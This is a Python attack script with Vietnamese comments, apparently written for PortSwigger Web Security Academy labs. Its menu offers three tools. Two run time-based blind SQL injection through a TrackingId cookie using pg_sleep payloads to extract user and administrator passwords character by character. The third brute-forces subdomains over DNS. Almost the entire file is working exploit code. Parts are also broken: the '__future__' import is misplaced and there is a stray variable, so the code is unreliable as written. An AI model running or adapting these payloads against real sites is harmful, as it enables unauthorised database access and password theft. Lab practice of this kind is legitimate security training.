import requests
import time
from __future__ import annotations
import sys
import argparse
import dns.resolver  #dnspython
import dns.exception

def chuc_nang_1 ():
    print("Dang chay...")
    url = input("Input URL: ").strip()
    Session = input("Input session: ").strip()
    TrackingId = input("Input TrackingID: ").strip()
    username = input("Input username: ").strip()

    #keep alive
    SESSION = requests.Session()
    #BKTT
    cookies = {
        "TrackingId": TrackingId,
        "Session": Session,
    }

    ###

    def blindsql(condition: str) -> bool:
        # Nếu tên đăng nhập là {username} VÀ điều kiện kiểm tra
        # {condition} đúng, hãy tạm dừng 4 giây (pg_sleep(4)), 
        # ngược lại không dừng (pg_sleep(0))
        #=> CASE WHEN ... THEN ... ELSE ... END ... --
        payload = (
            f"{TrackingId}'%3BSELECT+CASE+WHEN+(username='{username}'+AND+"
            f"({condition}))+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END+FROM+users--"
        )
        #copy cookie
        current_cookies = cookies.copy()
        #payload -> TrackingId
        current_cookies["TrackingId"] = payload

        try:
            # HTTP GET -> URL just wait for 10s
            response = SESSION.get(url, cookies=current_cookies, timeout=10)
            # >=4s is true (pg_sleep(4) - payload)
            if response.elapsed.total_seconds() >= 4:
                return True
        except requests.exceptions.RequestException:
            pass
            
        return False

    ###
    #MAX 50 char, TYPE HINTING: int
    def find_length(max_len=50) -> int:

        #range(start, stop + 1) -> range(1, 51)
        for n in range(1, max_len + 1):

            # is lenght = n?
            if blindsql(f"LENGTH(password)={n}"):
                return n
            #True return lenght
        raise RuntimeError("??? WTF if LENgth???")

    ###=============================================================
    # lo is " " and 126 is "~" 

    def find_char_binary(position: int, lo=32, hi=126) -> str:
        #ASCII 32-126 (a-z 0-9 and "[]{},./?';)

        while lo < hi: # => lo == hi #!!!

            # (32 + 126) :/ 2 
            mid = (lo + hi) // 2

            # is position is more than mid? TRUE/FALSE
            # SUBSTRING(password, {position}, 1) => position n, 1passwd
            # ASCII(...)
            # > {mid}
            
            if blindsql(f"ASCII(SUBSTRING(password,{position},1))>{mid}"):
                lo = mid + 1 # >50 or >n
                
            else:
                hi = mid # <50 or <n

        return chr(lo)   #!!!

    ###=============================================================

    def extract_password(length: int) -> str:
        result = ""

        for pos in range(1, length + 1):
            ch = find_char_binary(pos)#position
            result += ch

            print(f"Position {pos}: {ch} -> Current password: {result}")
        return result

    ###

    if __name__ == "__main__":
        print("Start...")
        #main is running
        try:
            # n = function
            n = find_length()
            print(f"Lenght Password: {n}")
            # pass = function
            password = extract_password(n)
            print(f"Password of {username}: {password}")

        #ERROR
        except Exception as e:
            print(f"Error: {e}")
def chuc_nang_2():
    print("Dang chay 2...")
    url = "https://0a1100eb032f1ab180463b1e00120060.web-security-academy.net/"
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""

    print("Bắt đầu lấy mật khẩu...")

    for i in range(1, 21):  # Mật khẩu dài 20 ký tự
        found_char = False
        for c in chars:
            payload = f"x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{c}') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users--"
            cookies = {'TrackingId': payload}
            
            start_time = time.time()
            try:
                requests.get(url, cookies=cookies, timeout=10)
            except requests.exceptions.Timeout:
                pass
            
            elapsed = time.time() - start_time
            
            # Nếu thời gian phản hồi lớn hơn 3.5 giây, ký tự đó là chính xác
            if elapsed > 3.5:
                password += c
                print(f"Vị trí {i}: {c} -> Password hiện tại: {password}")
                found_char = gef_False = True
                break
                
        if not found_char:
            print(f"Không tìm thấy ký tự ở vị trí {i}")
            break

    print(f"Mật khẩu hoàn chỉnh: {password}")
def chuc_nang_3():
    #!/usr/bin/env python3
    def build_resolver(nameservers: list[str] | None = None, timeout: float = 2.0) -> dns.resolver.Resolver:
        resolver = dns.resolver.Resolver() #not system
        resolver.timeout = timeout #timeout servername
        resolver.lifetime = timeout  #timeout
        if nameservers:
            resolver.nameservers = nameservers  
            #8.8.8.8 or 1.1.1.1
        return resolver


    def resolve_host(resolver: dns.resolver.Resolver, fqdn: str) -> list[str] | None:
        try:
            answer = resolver.resolve(fqdn, "A")     # gửi query loại A (IPv4) cho fqdn, chờ tối đa "lifetime" giây
            return [str(ip) for ip in answer]        # answer là iterable các bản ghi -> convert từng cái ra string IP
        except dns.resolver.NXDOMAIN:
            # NXDOMAIN = domain KHÔNG TỒN TẠI - kết quả bình thường của
            # brute-force (đa số từ trong wordlist sẽ rơi vào nhánh này)
            return None
        except dns.resolver.NoAnswer:
            # domain tồn tại nhưng KHÔNG có bản ghi A (có thể chỉ có
            # CNAME/MX...) - ở mức demo này coi như "không có IP"
            return None
        except dns.exception.Timeout:
            # mạng chậm / nameserver không phản hồi kịp trong "timeout" đã
            # đặt - KHÔNG có nghĩa là subdomain không tồn tại
            print(f"  [!] Timeout khi resolve {fqdn}", file=sys.stderr)
            return None
        except Exception as e:
            # bắt các lỗi hiếm gặp khác (vd SERVFAIL) để 1 lỗi lạ không
            # làm crash cả chương trình giữa chừng khi đang thử hàng ngàn từ
            print(f"  [!] Lỗi không xác định với {fqdn}: {type(e).__name__}", file=sys.stderr)
            return None


    def detect_wildcard(resolver: dns.resolver.Resolver, domain: str) -> list[str] | None:
        probe = f"random-check-not-exist-12345.{domain}"  # tên gần như chắc chắn không tồn tại thật
        return resolve_host(resolver, probe)                   # tái dùng lại đúng hàm resolve ở trên


    def load_wordlist(path: str) -> list[str]:
        with open(path, "r", encoding="utf-8") as f:            # mở file, encoding utf-8 để tránh lỗi ký tự lạ
            return [line.strip() for line in f if line.strip()] # strip() từng dòng, loại dòng rỗng sau khi strip


    def brute_force(domain: str, wordlist: list[str],
                    resolver: dns.resolver.Resolver,
                    wildcard_ips: list[str] | None) -> dict[str, list[str]]:
        found: dict[str, list[str]] = {}
        total = len(wordlist)

        for i, word in enumerate(wordlist, start=1):             # enumerate: vừa lấy từ vừa đếm thứ tự để in tiến độ
            fqdn = f"{word}.{domain}"                              # ghép "word" + "." + domain gốc thành subdomain đầy đủ
            ips = resolve_host(resolver, fqdn)                     # thử resolve, trả list IP hoặc None

            if ips is None:
                continue                                            # không resolve được -> bỏ qua, sang từ tiếp theo

            if wildcard_ips and set(ips) == set(wildcard_ips):
                # domain có wildcard VÀ kết quả trùng y hệt IP wildcard
                # -> nhiều khả năng là false positive, bỏ qua luôn
                continue

            found[fqdn] = ips                                       # ghi nhận kết quả thật vào dict
            print(f"[+] {fqdn} -> {', '.join(ips)}")                # in ngay lúc tìm thấy, không cần đợi quét xong hết

            if i % 100 == 0:                                         # cứ mỗi 100 từ báo tiến độ 1 lần
                print(f"    ... đã thử {i}/{total} từ", file=sys.stderr)

        return found


    def main() -> None:
        parser = argparse.ArgumentParser(description="Subdomain brute-force + DNS resolve")
        parser.add_argument("domain", help="Domain gốc, vd example.com")
        parser.add_argument("wordlist", help="Đường dẫn file wordlist")
        parser.add_argument("--nameservers", nargs="*", default=["8.8.8.8", "1.1.1.1"],
                            help="DNS resolver dùng để tra cứu (mặc định Google/Cloudflare)")
        parser.add_argument("--timeout", type=float, default=2.0, help="Timeout mỗi query (giây)")
        args = parser.parse_args()                                   # parse argv -> object có args.domain, args.wordlist...

        resolver = build_resolver(args.nameservers, args.timeout)
        wordlist = load_wordlist(args.wordlist)
        print(f"[*] Đã nạp {len(wordlist)} từ từ {args.wordlist}")

        print("[*] Kiểm tra wildcard DNS...")
        wildcard_ips = detect_wildcard(resolver, args.domain)
        if wildcard_ips:
            print(f"[!] {args.domain} có WILDCARD DNS (IP: {wildcard_ips}) - "
                f"sẽ tự loại các kết quả trùng IP này.")
        else:
            print("[*] Không phát hiện wildcard.")

        print(f"[*] Bắt đầu brute-force {len(wordlist)} subdomain cho {args.domain}...\n")
        results = brute_force(args.domain, wordlist, resolver, wildcard_ips)

        print(f"\n[*] Xong. Tìm thấy {len(results)} subdomain thật.")

        # TODO tự thử: thêm ThreadPoolExecutor hoặc asyncio (đã học ở bài
        # trước) để brute-force nhiều từ CÙNG LÚC thay vì tuần tự - với
        # wordlist vài ngàn từ, tuần tự sẽ rất chậm.


    if __name__ == "__main__":
        main()


while True:
    print("\n=== MENU ===")
    print("1- blind sql")
    print("2- pass")
    print("3- subdomain")
    print("0. Exit")
    luon_chon = input("Input: ")
    match luon_chon:
        case "1":
            chuc_nang_1()
        case "2":
            chuc_nang_2()
        case "3":
            chuc_nang_3()
        case "0":
            break
        case _:
            print("LOl wtf?")